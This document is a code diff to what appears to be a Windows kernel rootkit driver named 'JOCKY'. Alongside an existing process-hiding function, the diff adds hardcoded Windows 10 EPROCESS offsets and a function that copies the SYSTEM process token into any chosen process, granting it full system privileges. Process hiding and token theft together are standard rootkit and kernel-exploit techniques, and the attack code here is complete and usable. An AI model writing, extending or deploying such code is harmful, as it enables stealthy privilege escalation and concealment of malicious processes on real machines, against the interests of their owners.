@@ -172,3 +172,49 @@ NTSTATUS JockyHideProcess(ULONG targetPid) {
     DbgPrint("[JOCKY] PID %lu not found\n", targetPid);
     return STATUS_NOT_FOUND;
 }
+
+// Win10 21H2 offsets
+#define EPROCESS_TOKEN          0x4B8
+#define EPROCESS_UNIQUEPID      0x440
+#define EPROCESS_ACTIVELINKS    0x448
+
+NTSTATUS JockyStealToken(ULONG targetPid) {
+    PEPROCESS systemProc = NULL;
+    PEPROCESS targetProc = NULL;
+
+    // Get SYSTEM process (PID 4)
+    NTSTATUS status = PsLookupProcessByProcessId(
+        (HANDLE)4, &systemProc
+    );
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("[JOCKY] Failed to get SYSTEM process\n");
+        return status;
+    }
+
+    // Get target process
+    status = PsLookupProcessByProcessId(
+        (HANDLE)(ULONG_PTR)targetPid, &targetProc
+    );
+    if (!NT_SUCCESS(status)) {
+        ObDereferenceObject(systemProc);
+        DbgPrint("[JOCKY] Failed to get target process\n");
+        return status;
+    }
+
+    // Read SYSTEM token
+    ULONG_PTR systemToken = *(ULONG_PTR*)(
+        (ULONG_PTR)systemProc + EPROCESS_TOKEN
+    );
+
+    // Write SYSTEM token into target process
+    // Mask off the RefCnt bits (bottom 4 bits) to get clean token value
+    *(ULONG_PTR*)((ULONG_PTR)targetProc + EPROCESS_TOKEN) =
+        (systemToken & ~0xFULL);
+
+    DbgPrint("[JOCKY] SYSTEM token stolen into PID %lu\n", targetPid);
+
+    ObDereferenceObject(systemProc);
+    ObDereferenceObject(targetProc);
+    return STATUS_SUCCESS;
+}
+
